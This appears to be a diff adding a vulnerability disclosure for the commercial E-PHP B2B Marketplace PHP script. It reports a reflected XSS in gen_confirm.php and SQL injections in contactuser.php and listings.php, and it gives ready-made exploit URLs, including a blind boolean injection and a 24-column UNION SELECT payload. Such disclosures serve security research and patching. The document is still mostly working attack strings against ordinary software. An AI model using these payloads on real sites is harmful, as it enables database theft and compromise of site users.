@@ -1,0 +1,32 @@
+/*
+
+Name : E-PHP B2B Marketplace Multiple Vulns
+WebSite : http://www.ephpscripts.com/b2b-trading-portal.php
+Price : 150 USD
+
+Author : Hamza 'MizoZ' N.
+Email : mizozx@gmail.com
+
+
+*/
+
+# XSS
+
+- gen_confirm.php shows the error message of $_GET['errmsg'] , but it's not
+protected against XSS
+
+- Exploit : [HOST]/[PATH]/gen_confirm.php?errmsg=
+
+# Blind SQLi
+
+- contactuser.php suffers from a blind sqli in the get "es_id"
+
+- Exploit : [HOST]/[PATH]/contactuser.php?es_type=3&es_id=62+and+1=(select
+1)--
+
+# SQLi
+
+- listings.php suffers from a blind sqli in the get "mem_id"
+
+- Exploit :
+[HOST]/[PATH]/listings.php?mem_id=-207+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--
